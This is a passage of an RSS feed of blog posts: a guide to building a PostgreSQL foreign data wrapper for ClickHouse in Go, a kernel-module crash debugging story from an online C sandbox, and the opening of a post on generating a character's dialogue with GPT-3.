<p>One caveat is that the extent of features you can expect from a FDW is dependent on the particular implementation.
We can expect normal read support but other niceties like push-down filters, aggregations or joins, or write support can be missing.</p>

<h2 id="accessing-clickhouse-ch-via-postgres-pg">Accessing Clickhouse(CH) via Postgres(PG)</h2>

<p>Given the existence of so many possibilities of accessing other datastores, wouldn’t it be fun if we could access Clickhouse from inside Postgres.</p>

<p>Why would you want to do it! you may ask.</p>

<p>Well one reason could be of course, for <em>fun</em>.</p>

<p>But more realistically, one of the ambitious use cases at <a href="https://messagebird.com/">MessageBird</a>(my employer) was the ability to connect Clickhouse to <a href="https://looker.com/">Looker</a> as no direct integration existed at that time.
It was a bit of a moonshot but we decided to give it a try to see if it would work :)</p>

<p>MessageBird has generously made the full source for our experiment open source! The repository is available <a href="https://github.com/messagebird/clickhouse-postgres-fdw">here</a>.
So you can reference the ideas mentioned in the blog post directly in the code as well :)</p>

<h3 id="now-on-to-writing-one-fdw">Now on to writing one FDW!</h3>

<p>There are already <a href="https://www.postgresql.org/docs/current/fdwhandler.html">documentations</a> on how we should approach this and some simple examples are also available on Github. Most of the full fledged FDWs have their code in open so we can consult them as well.
Note that most of them are written in C becauses the FDW API of PG is in C, which makes sense.
I should highlight one particular <a href="https://github.com/pgspider/sqlite_fdw">FDW</a> that is made for SQLite and has a solid feature set, which helped me a lot while writing the one for Clickhouse.</p>

<p>But what if we want to be adventurous and write one in Go? Well, it should be possible given the existence of <a href="https://golang.org/cmd/cgo/">CGo</a>.</p>

<p>We can expect that it will not be at all trivial. ;)
There are already attempts on making Postgres Extensions in <a href="https://github.com/liztio/k8s-fdw">Go</a>, which gives a very valuable insight.</p>

<h4 id="setting-up-the-build-process-and-interaction-between-go-and-postgres-c-api">Setting up the build process and interaction between Go and Postgres C API</h4>

<p>First we should familiarize ourselves with the <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PG Extension Build Infrastructure/PGXS</a> and how to write <a href="https://www.postgresql.org/docs/current/xfunc-c.html#DFUNC">C code</a> for PG.
These are crucial as we would want to integrate the C code with Go, and knowing how the build process works should help us in understanding where our code will fit.</p>

<p>For writing a FDW we have to provide an entry point in form of a <code>struct</code> containing function pointers to the implemented callback functions.
Since we want to write those callback in Go, we can consult documentation for <a href="https://golang.org/cmd/cgo/#hdr-C_references_to_Go">accessing Go functions in C</a>, which says there are specific annotations that should allow us to export go functions outside to the C code.
All the important work is done in these callbacks only.<br>
Now it should be possible to add functions that PG FDW API expects via Go.</p>

<p>But, how will the C code find the callback functions written in Go land ? <a href="https://golang.org/cmd/go/#hdr-Build_modes">Go build modes</a> is the answer.
Directly referencing from the documentation, the <code>-buildmode=c-archive</code> allows us to:</p>

<pre><code>Build the listed main package, plus all packages it imports,
into a C archive file. The only callable symbols will be those
functions exported using a cgo //export comment. Requires
exactly one main package to be listed.
</code></pre>

<p>Perfect! Now, the exported Go functions are available in the <a href="https://linux.die.net/man/1/ar">archive file</a>.
The only remaining thing is to link the archive with C code during build.
Thankfully, <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PGXS</a> provides a <code>Make</code> variable <code>SHLIB_LINK</code> that can be used to set the shared library used. So we’ll use that flag to provide the archive build from Go source files.</p>

<p>You can see it in action <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/Makefile">here</a>.</p>

<!-- * how linking go code to c via statically linked libraries works ? .a files linking with Go. -->

<!-- And we want a library of sorts which should be callable inside C code. For this we can use go build mode (c-archive), this will create a statically linked archive(see difference btwn shared objects and statically linked libraries and how to build them) -->

<h4 id="understanding-inner-working-of-the-fdw-api-and-their-relation-with-different-query-stages">Understanding inner working of the FDW API and their relation with different Query Stages</h4>

<!-- * Figuring out which stages do what, what do you want and where to look for them -->

<p>To actually write a working FDW, we need to familiarize with the different stages a query goes through in PG and how the API functions play them out.
Postgres has an excellent documentation and moreover since all the <a href="https://github.com/messagebird/clickhouse-postgres-fdw/">source code</a> is open, we can just navigate through the code as well!</p>

<p>It would take more space than a blog post to explain the full internals of Query planner in Postgres and I probably can’t describe it well enough.
So, I suggest to go through <a href="https://www.postgresql.org/docs/current/fdw-callbacks.html">the official documentation</a> which is quite excellent and there are many other excellent references on the web.</p>

<p>I’ll try to briefly explain the flow of the API functions for the context of this post.
A very basic plan looks like this:</p>

<pre><code>+-------------------------+
|                         |
|                         |
|    GetForeignRelSize    |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     GetForeignPaths     |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     GetForeignPlan      |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     BeginForeignScan    |
|                         |
|                         |
+------------+------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|    IterateForeignScan   |
|                         |
|                         |
+-------------------------+
             |
             |
             |
+------------v------------+
|                         |
|                         |
|     EndForeignScan      |
|                         |
|                         |
+-------------------------+

</code></pre>

<p>There are other functions in the FDW API that I’ve omitted here (like <code>ReScanForeignScan</code>, <code>AnalyzeForeignTable</code>, <code>GetForeignUpperPaths</code>) but a basic FDW can be done with these.
Also note that this path is only concerned with the read queries. To enable writing on the foreign database, there are separate functions that need to be implemented.
You can see how the read path is implemented for our clickhouse FDW <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/ch_fdw.c">here</a>.</p>

<p>Important ones to take note of to properly implement the read path of a query are:</p>

<ul>
<li><p>GetForeignRelSize: It should be used to determine the estimated number of rows to be scanned on the foreign server. However, it is also used to extract the restriction clauses present in the query presented by PG and to pass them to the foreign server if it can support them.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L180">example</a>.</p></li>

<li><p>GetForeignPlan: It should return the planner node(a data structure that contains the query plan). However, it is also used to extract the target columns that can be fetched from remote/foreign servers and pass that info along with restriction clauses, table names to the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L275">example</a>.</p></li>

<li><p>BeginForeignScan: It should perform the initalization that is needed to perform the scan on the foreign server, for example: initialize the foreign DB connection, formalize the query running on foreign server and init the state with row iterator to be used in the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L508">example</a>.</p></li>

<li><p>IterateForeignScan: It should return a row from the foreign server converted to the PG specific structure. This function should convert the foreign server specific data types to PG column data types.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L620">example</a>.</p></li>

<li><p>EndForeignScan: It should clean the state being stored for the query, like row iterators, db connections should be closed.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L760">example</a>.</p></li>
</ul>

<p>This is a very dense overview of the functionality of a <em>basic</em> FDW. It usually helps to look around the other FDWs that are open source to look for ideas of a sample implementation. But it can differ since the foreign server can be of various types.
Usually, if we take databases that support some dialect of SQL then the hardest things are usually figuring out if the restriction clauses are remote safe, which can involve parsing the full expression clauses and then converting them to remote variants.
Converting the foreign server datatypes to PG types is comparatively easy but is very toiling.</p>

<p>You can look into how <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go">clickhouse FDW</a> does this to get an idea, but beware that it could be bug prone, since it hasn’t been tested thoroughly.</p>

<p>I’ll also suggest getting an idea of commonly used PG datatypes and conventions like <code>OID</code>, <code>Tuple</code>, <code>RelOptInfo</code> or just going over <a href="https://doxygen.postgresql.org/relation_8h.html"><code>relation.h</code></a> reference from PG source code.</p>

<h3 id="few-tips-and-tricks">Few Tips and Tricks</h3>

<p>These are some ideas that I’ve seen are fairly used while developing a FDW. Some can help in easy interop between Go and C, whether it is a good idea or not, is up for debate ;)</p>

<h4 id="interfacing-c-macros-within-go">Interfacing C macros within Go</h4>

<p>There are a lot of internal macros in PG source which makes it easier to access system cache, lists, heap tuples etc. which aren’t directly callable from Go’s userland.<br>
This is because CGo doesn’t quite allow directly calling C <code>#define</code> macros.<br>
You can try to simulate the same behaviour using underlying constructs but that can get hairy and cumbersome. Instead one <em>easy</em> idea is to define simple C wrapper functions like</p>

<pre><code>void *wrapper_access_list(void *list, int index){
	return access_list(list, index);
}
</code></pre>

<p>This can now be used directly on Go side. But make sure you cast the results to proper types.</p>

<h4 id="moving-out-c-code">Moving out C code</h4>

<p>There can be a point where writing C code directly in Go source files is not feasible …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/">https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/</a></em></p>]]>
            </description>
            <link>https://arunsori.me/posts/postgres-clickhouse-fdw-in-go/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153782</guid>
            <pubDate>Thu, 19 Nov 2020 20:09:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My First Kernel Module: A Debugging Nightmare]]>
            </title>
            <description>
<![CDATA[
Score 123 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25153388">thread link</a>) | @ksml
<br/>
November 19, 2020 | https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html | <a href="https://web.archive.org/web/*/https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This is the story of the time I wrote some code, deployed it to production, and
ended up bricking the server it was running on by frying the kernel.</p>

<figure>
    <a href="https://reberhardt.com/blog//images/my-first-kernel-module/frying-pan.jpg">
        <img src="https://reberhardt.com/blog//images/my-first-kernel-module/frying-pan.jpg" alt="Beautiful rendition of me frying the kernel">
    </a>
    
    <figcaption>Beautiful rendition of me frying the kernel</figcaption>
    
</figure>

<p>This post is about perils of concurrency and race conditions.  My code was
nearly correct, but ultimately, there were two major synchronization bugs that
killed it.</p>

<!--more-->

<p>This is a really long post that gets into the weeds at times, but I have tried
to write it so that you can jump into any section and hopefully learn something
from it:</p>

<ul>
  <li><a href="#a-nightmare-begins">A nightmare begins</a>: How I discovered this issue and
initially triaged it</li>
  <li><a href="#context-c-playground-visual-debugger">Context: C Playground visual
debugger</a>: How Linux <code>/proc</code> files
work, and how Linux stores process and open file information. I drew some
spiffy diagrams so you can visualize how this works!</li>
  <li><a href="#the-debugging-process">The debugging process</a>: How I attempted to track
down the bug(s)
    <ul>
      <li><a href="#finding-a-footing">Finding a footing</a></li>
      <li><a href="#red-herrings">Red herrings</a></li>
      <li><a href="#the-processes-smell-fishy">The processes smell fishy</a></li>
      <li><a href="#desperation-and-the-start-of-progress">Desperation, and the start of progress</a></li>
      <li><strong><a href="#rcu-read-copy-update">RCU: Read, Copy, Update</a>: The cause of (and fix for) my first bug</strong></li>
      <li><a href="#fix-1-dont-block-in-critical-sections">Fix #1: Don’t block in critical sections</a></li>
      <li><a href="#the-emotional-rollercoaster-continues">The emotional rollercoaster continues</a></li>
      <li><a href="#fix-2-rebuilding-the-kernel">Fix #2: Rebuilding the kernel</a></li>
    </ul>
  </li>
  <li><a href="#conclusion">Conclusion</a>: Takeaways and lessons learned</li>
</ul>

<p><strong>Looking for a quick read?</strong> Skip to the <a href="#rcu-read-copy-update">RCU: Read, Copy,
Update</a> section for spoilers.</p>

<p>In this post, I assume you have some understanding of how files and concurrency
work on Unix systems. I will try to explain everything else!</p>

<h2 id="a-nightmare-begins">A nightmare begins</h2>

<p>I have been working on building a <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">graphical debugger for C Playground</a> for
some time, allowing users to run code in the browser and visualize how their
program is being executed. As part of this work, I had to implement a kernel
module. (I’ll explain more about this project in the next section.) After
testing the code locally for a few months, I pushed it to production.</p>

<p>The next morning, I woke up to a text from my roommate: <em>“I think the server
crashed.”</em> Uh oh, that’s not supposed to happen. I quickly pulled out my laptop
and tried to SSH into the server to pull the logs, but to my surprise, I
couldn’t reach the server:</p>

<div><div><pre><code>ssh: connect to ... port 22: Operation timed out
</code></pre></div></div>

<p>Something wasn’t right. I logged into DigitalOcean to restart the machine, but
while I was doing that, I noticed a spike in the server’s CPU usage graph
around the time my roommate texted me. The CPU was cleanly pegged at 100%.
Normally, if a process running on the machine is hogging the CPU, we should
expect to see slight fluctuations around 100%, but that was not the case here
– it was a clean, horizontal line.</p>

<figure>
    <a href="https://reberhardt.com/blog//images/my-first-kernel-module/digitalocean-cpu-usage.png">
        <img src="https://reberhardt.com/blog//images/my-first-kernel-module/digitalocean-cpu-usage.png" alt="">
    </a>
    
</figure>

<p>After force-restarting the server via DigitalOcean and rolling back the
debugging feature, I started going through logs to get a sense for what
happened. My kernel module has print statements, and these get saved to the
kernel’s log in <code>/var/log/kern.log</code>. I scanned through this file, hoping to
find some clues, but this only confused me even more; there was <em>nothing</em> in
the kernel logs from any time near when the server locked up. It seemed to
suggest my kernel module wasn’t even running at that time. But I felt it <em>had</em>
to be a problem with my kernel module: nothing in user space could cause a
computer to lock up the way it did, completely unresponsive and pegged at 100%
CPU.</p>

<p>I kept digging. If the kernel logs didn’t give me anything helpful, maybe there
might be some application-side records that would indicate what happened.
However, when I checked the C Playground log file, I felt things only getting
worse:</p>

<div><div><pre><code>[2020-03-25T14:47:00-0400] [INFO]   [p5wDiTxoeX4hdYwDAAEm] Websocket connection received from &lt;redacted&gt;
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Program is at alias lion-eland-echidna
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Run logged with ID 55229
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Saving code to /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Successfully created gdb socket at /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8-gdb.sock
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Starting container: docker run -it --name dfb5e628-595f-464d-a4dd-1559db7b78d8 --read-only --tmpfs /cplayground:mode=0777,size=32m,exec -v /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8:/cplayground/code.cpp:ro -v /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8-include.zip:/cplayground/include.zip:ro -e COMPILER=g++ -e CFLAGS=-g -std=c++17 -O0 -Wall -no-pie -lm -pthread -e SRCPATH=/cplayground/code.cpp --cap-drop=all --memory 96mb --memory-swap 128mb --memory-reservation 32mb --cpu-shares 512 --pids-limit 16 --ulimit cpu=10:11 --ulimit nofile=64 --network none -v /srv/cplayground/data/dfb5e628-595f-464d-a4dd-1559db7b78d8-gdb.sock:/gdb.sock --cap-add=SYS_PTRACE -e CPLAYGROUND_DEBUG=1 cplayground /run.py
[2020-03-25T14:47:00-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Initial terminal size 80x24
[2020-03-25T14:47:01-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Resize info received: 17x74
[2020-03-25T14:47:01-0400] [LOG]    [p5wDiTxoeX4hdYwDAAEm] Resize info received: 17x75
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@
&lt;truncated for brevity&gt;
</code></pre></div></div>

<p>What on earth is <em>that</em>???</p>

<p>After some Googling, I figured out that <code>^@</code> is how <code>less</code> displays null bytes.
So, my log file is filled with null bytes. Why would that be?</p>

<p>Then it occurred to me: Filesystem writes aren’t synchronous. When a program
writes to a file, the data is usually not immediately written to disk. Instead,
to improve performance, the data is written to a buffer in memory. Normally,
the kernel flushes this buffer to disk periodically, so that the data is
persisted. But if the kernel is incapacitated, there is no way the data can
reach the disk, and when the machine force-restarts, it is lost forever. From
the above output, I could see that parts of the logs made it to disk, but later
parts of the logs were not so lucky, appearing as scrambled null bytes instead.</p>

<p>I started to feel a sense of dread creeping in. This was reminding me of the
extremely late nights and brain-frying debugging sessions from that time I took
an operating systems class. Except this might be even worse: This problem is
<em>only</em> happening in production, and I can’t reproduce it, and I can’t get any
logs to explain what’s wrong.</p>

<p>In the next section, I’ll explain what my kernel module was doing, so that you
can follow along with my debugging process. Then, in the last section, I’ll
talk you through the long, long process I went through to identify the <em>two</em>
bugs that caused this problem. (Spoiler alert: there were two race conditions
that caused two use-after-frees, in which I attempted to use memory after it
had already been freed.)</p>

<h2 id="context-c-playground-visual-debugger">Context: C Playground Visual Debugger</h2>

<p>I have been working on <a href="https://cplayground.com/">C Playground</a> for some time,
which is an online sandbox for quickly testing out C and C++ code. It is
specifically designed for learning systems programming, and I have been working
on features that generate diagrams to illustrate what is happening under the
hood when you run code on a computer.</p>

<p>Most recently, I was working on generating diagrams of the data structures that
the kernel uses to keep track of a program’s open files. The context and
motivation for this are described in much more detail in <a href="https://reberhardt.com/blog/2019/12/12/generating-diagrams-for-teaching-multiprocessing.html">this blog
post</a>.
As a very brief summary, this feature aims to help students understand system
calls such as <code>open</code>, <code>close</code>, <code>dup2</code>, <code>fork</code>, <code>pipe</code>, and others. Using these
system calls requires an understanding of what they are doing on your behalf.
Usually, we explain these system calls in terms of the <em>vnode table</em>, which
caches information about files on the system, the <em>open file table</em>, which
stores <em>session</em> information (e.g. program X has file Y open for reading, and
has read 100 bytes so far), and the <em>file descriptor table</em>, which stores
pointers into the open file table indicating which sessions a process has open.</p>

<p>When teaching these concepts, we typically draw a lot of diagrams by hand. C
Playground aims to generate diagrams automatically, helping students to build
up and confirm their intuitions without needing access to a TA. The platform
allows students to set breakpoints and step through …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html">https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html</a></em></p>]]>
            </description>
            <link>https://reberhardt.com/blog/2020/11/18/my-first-kernel-module.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153388</guid>
            <pubDate>Thu, 19 Nov 2020 19:30:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Giving Characters Life with GPT3]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25153289">thread link</a>) | @frankcarey
<br/>
November 19, 2020 | https://fable-studio.com/behind-the-scenes/ai-generation | <a href="https://web.archive.org/web/*/https://fable-studio.com/behind-the-scenes/ai-generation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5f9c97762725f32ff02f0613" id="sections">
  
    <section data-section-id="5f9c97762725f32ff02f0615" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
      &quot;imageOverlayOpacity&quot;: 0.15,
      &quot;video&quot;: {
        &quot;playbackSpeed&quot;: 0.5,
        &quot;filter&quot;: 1,
        &quot;filterStrength&quot;: 0,
        &quot;zoom&quot;: 0
      },
      &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
      &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
      &quot;customSectionHeight&quot;: 10,
      &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
      &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
      &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
      &quot;customContentWidth&quot;: 50,
      &quot;sectionTheme&quot;: &quot;white&quot;,
      &quot;sectionAnimation&quot;: &quot;none&quot;,
      &quot;backgroundMode&quot;: &quot;image&quot;
    }" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5f9c97762725f32ff02f060f"><div><div><div data-block-json="{&quot;blockAnimation&quot;:&quot;none&quot;,&quot;layout&quot;:&quot;caption-below&quot;,&quot;overlay&quot;:false,&quot;description&quot;:{&quot;html&quot;:&quot;<p class=\&quot;\&quot; style=\&quot;white-space:pre-wrap;\&quot;>Lucy is the charmed hero of Neil Gaiman &amp;amp; Dave McKean\u2019s <em>Wolves in the Walls</em>, adapted by Fable. The dialogue in this video was generated by Artificial Intelligence. </p>&quot;,&quot;raw&quot;:false},&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;<iframe src=\&quot;https://player.vimeo.com/video/471505831?app_id=122963&amp;amp;wmode=opaque\&quot; width=\&quot;426\&quot; height=\&quot;240\&quot; frameborder=\&quot;0\&quot; allow=\&quot;autoplay; fullscreen\&quot; allowfullscreen=\&quot;\&quot; title=\&quot;Fable - AI Generated Episode 1\&quot;></iframe>&quot;,&quot;url&quot;:&quot;https://vimeo.com/471505831/664bd00858&quot;,&quot;thumbnailUrl&quot;:&quot;https://i.vimeocdn.com/video/984156173_295x166.jpg&quot;,&quot;resolvedBy&quot;:&quot;vimeo&quot;}" data-block-type="32" id="block-yui_3_17_2_1_1604099397066_3873"><div><div><p>Lucy is the charmed hero of Neil Gaiman &amp; Dave McKean’s <em>Wolves in the Walls</em>, adapted by Fable. The dialogue in this video was generated by Artificial Intelligence. </p></div></div></div><div data-block-type="2" id="block-903ca1e9a8682cce8ca6"><div><p>At Fable, we’re building next-generation AI to create interactive stories with what we’re calling “Virtual Beings.”&nbsp;</p><p>As creators at the fore of this exciting new space, where AI is both a tool and an art-form, we’ve seen that if we remove the artist and rely completely on generative AI, it inevitably goes off the rails and delivers underwhelming results. While there are many entertaining examples of both profound and ridiculous sentences generated by AI on the internet, these responses are very unpredictable and the feeling of having a natural conversation is quickly lost.</p><p>Natural conversations are not like talking to Siri or your smart speaker either. There, the relationship is a transactional one with the AI only focused on solving an immediate request from you. Very little context is carried between interactions so they have no emotional intelligence, making them frustrating to interact with. Instead, we humans should be better represented within an AI’s brain. It should have memories of us and our conversations and continue that shared context into future conversations. It should anticipate us instead of just reacting to us. In short, what’s missing is that you should feel “seen”.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1605570854118_5574"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1604696479692-UEEYHDO59CM5AJ15QZ1W/ke17ZwdGBToddI8pDm48kII-a8d2AJAcajZPY95mRzYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2djO80xWYnvFFMgHmU-X49BeuYeUGWtxLCBQRc1ncHc2cJvwGh1qtNWvMhYKnvaKhbA/LucyMultiLayerTracking2.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1604696479692-UEEYHDO59CM5AJ15QZ1W/ke17ZwdGBToddI8pDm48kII-a8d2AJAcajZPY95mRzYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2djO80xWYnvFFMgHmU-X49BeuYeUGWtxLCBQRc1ncHc2cJvwGh1qtNWvMhYKnvaKhbA/LucyMultiLayerTracking2.jpg" data-image-dimensions="1500x804" data-image-focal-point="0.5829207700627103,0.36022512802055306" alt="LucyMultiLayerTracking2.jpg" src="https://fable-studio.com/behind-the-scenes/LucyMultiLayerTracking2.jpg"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div><div><blockquote><p>It should anticipate us instead of just reacting to us. In short, what’s missing is that you should feel “seen”.</p></blockquote></div></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605570854118_5864"><div><p>We’re interested in granting these skills to our own characters, which sit atop amazing artificial intelligence technologies like GPT-3. To demonstrate how far we’ve come toward accomplishing our goal of AI-driven storytelling and emotional intelligence, we created this scene of our character Lucy in conversation with a Guest. GPT-3, OpenAI’s powerful Transformer NLP model that’s been trained on a large corpus of text, is generating almost all of the things said in this video. Essentially, we give the AI some context, and it attempts to complete the text in an intelligent way. It shows how close we are to having natural conversations with an AI that really sees us as individual emotional beings and not task masters by leveraging humans to help guide and train it.</p><p>In an effort to inspire others and move the field forward, let me share some of how we’re doing this on the technology side. Below is a significant subset of the exact context that we gave GPT-3 in the making of this scene. We simply tell it about how we want the conversation to proceed as well as some details about who Lucy and the Guest are so it can generate new dialogue lines with that context.</p><p>CONTEXTS:</p><ul data-rte-list="default"><li><p>The following is a conversation between Lucy and Guest over text messages.</p></li><li><p>In Lucy's world, which is different from the Guest's, the date is 1988, while for the Guest it is still 2020.</p></li><li><p>The Guest reaches out to Lucy over chat message and Lucy responds in a playful way, asking if the Guest is a foozle and comes in peace.</p></li><li><p>Lucy says she can never sleep when the full moon is out, so she's awake now and passing the time by looking out the window for shooting stars.</p></li><li><p>Lucy continues to get to know the guest, asking them lots of personal questions and being imaginative.</p></li><li><p>Lucy eventually asks if the Guest has ever seen a shooting star and what the Guest wished for.</p></li><li><p>Finally, Lucy sees the shooting star, makes her wish, which she keeps as a secret or it won't come true, and then says goodnight.</p></li></ul><p>&nbsp;&nbsp;LUCY:</p><ul data-rte-list="default"><li><p>Little Girl.</p></li><li><p>Active Imagination.</p></li><li><p>Age 8.</p></li><li><p>Lives with Brother, Mom, and Dad.</p></li><li><p>Likes Mysteries, Science, and Drawing.</p></li><li><p>Is looking for a shooting star.</p></li><li><p>Is superstitious and likes horoscopes.</p></li><li><p>Is a daydreamer.</p></li></ul><p>GUEST:</p><ul data-rte-list="default"><li><p>A curious and friendly person who was just introduced to Lucy.</p></li></ul></div></div><div data-block-type="5" 